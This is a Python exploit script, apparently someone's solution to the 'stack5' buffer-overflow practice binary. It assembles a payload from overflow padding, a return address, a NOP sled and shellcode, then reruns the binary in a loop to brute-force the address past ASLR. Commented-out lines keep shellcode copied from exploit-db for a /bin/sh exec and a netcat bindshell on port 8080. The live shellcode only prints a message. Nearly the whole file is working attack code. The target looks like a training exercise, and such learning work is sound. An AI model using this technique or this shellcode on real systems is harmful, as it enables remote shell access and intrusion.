#!/usr/bin/python

from __future__ import print_function
from Opcoad import convert_opcode
from Opcoad import convert_str_to_hex_bytes
from Opcoad import convert_opcode_bytes
from Opcoad import generate_addrs
from Opcoad import escape_hex
from Opcoad import reverse_endianness
from struct import pack
from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()
import time
import sys


BINARY_NAME = "stack5"


def main():
    # LOCAL VARIABLES
    upperLim = 1000  # Don't execute BINARY_NAME more than upperLim times
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    buffOverflow = escape_hex("90" * 76)
    newRet = escape_hex("41414141")  # 0xffe16330, 0xfff5cfe0, 0xffc53620, 0xff92ce90, 0xff8ab9f0
    hexAddr = ""  # Convert addresses to hex strings here
    nopSled = escape_hex("90" * 100)
    # Linux/x86 - stdin re-open and /bin/sh exec Shellcode (39 bytes) - https://www.exploit-db.com/exploits/13357/
    # shellCode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    # Linux/x86 - netcat bindshell port 8080 Shellcode (75 bytes) - https://www.exploit-db.com/exploits/14332/
    # shellCode = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23"
    # Pink slip shell code
    # shellCode = "\xeb\x13\x48\x31\xc0\xb0\x01\xbf\x01\x00\x00\x00\x5e\x48\x31\xd2\xb2\x29\x0f\x05\x90\xe8\xe8\xff\xff\xff\x54\x68\x61\x74\x20\x77\x65\x61\x76\x65\x20\x67\x6f\x74\x74\x61\x20\x67\x6f\x2e\x20\x50\x69\x6e\x6b\x20\x73\x6c\x69\x70\x2e\x20\x2d\x43\x61\x72\x64\x69\x20\x42\x0a\x00"
    # Pink slip shell code minus the newline
    # shellCode = "\xeb\x13\x48\x31\xc0\xb0\x01\xbf\x01\x00\x00\x00\x5e\x48\x31\xd2\xb2\x29\x0f\x05\x90\xe8\xe8\xff\xff\xff\x54\x68\x61\x74\x20\x77\x65\x61\x76\x65\x20\x67\x6f\x74\x74\x61\x20\x67\x6f\x2e\x20\x50\x69\x6e\x6b\x20\x73\x6c\x69\x70\x2e\x20\x2d\x43\x61\x72\x64\x69\x20\x42\x00\x00"
    # Pink slip shell code compiled for cdecl calling convention (no newline)
    # shellCode = "\xeb\x10\x48\x31\xc0\x5e\x6a\x28\x56\x6a\x01\x6a\x01\x0f\x05\x83\xc4\x20\xe8\xeb\xff\xff\xff\x54\x68\x61\x74\x20\x77\x65\x61\x76\x65\x20\x67\x6f\x74\x74\x61\x20\x67\x6f\x2e\x20\x50\x69\x6e\x6b\x20\x73\x6c\x69\x70\x2e\x20\x2d\x43\x61\x72\x64\x69\x20\x42\x00"
    # Pink slip shell code compiled for cdecl calling convention (no newline) syscall number in rax
    # shellCode = "\xeb\x13\x48\x31\xc0\x5e\x6a\x28\x56\x6a\x01\xb8\x01\x00\x00\x00\x0f\x05\x83\xc4\x18\xe8\xe8\xff\xff\xff\x54\x68\x61\x74\x20\x77\x65\x61\x76\x65\x20\x67\x6f\x74\x74\x61\x20\x67\x6f\x2e\x20\x50\x69\x6e\x6b\x20\x73\x6c\x69\x70\x2e\x20\x2d\x43\x61\x72\x64\x69\x20\x42\x00"
    # Pink slip shell code updated based on RE'd syscall to write
    # shellCode = escape_hex("eb154831c0b801000000bf010000005e4831d2b2280f05e8e6ffffff5468617420776561766520676f74746120676f2e2050696e6b20736c69702e202d4361726469204200")
    # Pink slip shell code with int 80h instead of int 0x80 (?)
    shellCode = escape_hex("eb15bf010000005e4831d2b2284831c0b804000000cd80e8e6ffffff5468617420776561766520676f74746120676f2e2050696e6b20736c69702e202d4361726469204200")
    # print(shellCode)  # DEBUGGING

    # payload = shellCode + ("\xCC" * (76 - shellCode.__len__())) + pack("I", 0xffffd290)
    # shellCode = pack("I", 0x909090CC)
    # shellCode = "909090CC"
    # payload = ("HarkRulz" * 8) + ("hark" * 3) + shellCode
    # payload = "90" * 32 + "90" * 6 + shellCode

    # Good(?) but flawed algorithm
    # shellCode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    # payload = shellCode + ("\xCC" * (76 - shellCode.__len__())) + escape_hex("ffffd290")  # escape_hex() makes bytearrays, don't use
    # payload = shellCode + ("\xCC" * (76 - shellCode.__len__())) + "\xff\xff\xd2\x90"

    # Troubleshoot
    # shellCode = "\x90\x90\x90\xCC"
    # payload = shellCode + ("\x90" * (76 - shellCode.__len__())) + "\xff\xff\xd2\x90"
    # payload = shellCode + ("\x90" * 76) + "\xff\xff\xd2\x90"
    # payload = shellCode + ("\x90" * 68) + "\xff\xff\xd2\x90"
    # payload = shellCode + ("\x90" * 68) + "\x90\xd2\xff\xff"
    # This payload works
    # payload = shellCode + ("\x90" * 72) + "\x90\xd2\xff\xff"  # In memory backwards but read forwards!

    # My shellcode + payload
    # print(shellCode.__len__())  # DEBUGGING
    # print(76 - shellCode.__len__())  # DEBUGGING
    # print("\x90" * (76 - shellCode.__len__()))  # DEBUGGING
    # payload = shellCode + ("\x90" * (76 - shellCode.__len__())) + "\x90\xd2\xff\xff"
    # payload = shellCode + ("\x90" * (76 - shellCode.__len__())) + "\x41\x41\x41\x41"
    # print(payload.__len__())  # DEBUGGING
    # print(payload)  # DEBUGGING
    payload = ""
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # OUTPUT PAYLOAD
    # NOTE: Commented out because I'm setting up for an automated anti-ASLR brute-force run
    # with open("stack5-Opcoad-solution.txt", "w") as outFile:
        # outFile.write(payload)

    

    # RUN IT
    with open(BINARY_NAME + "-ASLR_brute_force.txt", "w") as output:
        commandList.append(absBinFilename)
        print("Attempting to brute force {}\n[".format(BINARY_NAME), end="")
        sys.stdout.flush()
        # for ignoreThis in range(0, upperLim):
        while True:
            binary = Popen(commandList, env = currEnv, stdin = PIPE, stdout = PIPE, stderr = PIPE)
            if binary is not None:
                # CONSTRUCT PAYLOAD
                try:
                    newRet = generate_addrs(None, None, [0x8a, 0xf5], "ff")
                    # newRet = generate_addrs([20, 21], [144, 145], [250, 251], "ff")  # DEBUGGING
                    # newRet = generate_addrs([20, 21], [144, 145], [250, 251], [255, 255])  # DEBUGGING
                except Exception as err:
                    print(repr(err))
                    print(newRet)
                    raise err
                # else:
                #     for char in newRet:
                #         print(ord(char))
                # print(newRet)  # DEBUGGING
                # print(escape_hex(newRet))  # DEBUGGING
                # print(type(newRet))  # DEBUGGING
                # print(newRet.__len__())  # DEBUGGING
                hexAddr = reverse_endianness(newRet)
                payload = buffOverflow + escape_hex(newRet) + nopSled + shellCode
                # print(hexAddr)  # DEBUGGING
                output.write("Trying address:\t{}\n".format("0x" + hexAddr))
                tmpRet = binary.communicate(payload)
                if tmpRet[0] or tmpRet[1]:
                    # print(tmpRet)  # DEBUGGING
                    print("!", end="")
                    sys.stdout.flush()
                    output.write(tmpRet)
                    break
                else:
                    print(".", end="")
                    sys.stdout.flush()
                time.sleep(1)
                binary.wait()  # Block                
    print("]")

    # OUTPUT PAYLOAD
    with open("stack5-Opcoad-solution.txt", "w") as outFile:
        outFile.write(payload)

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))

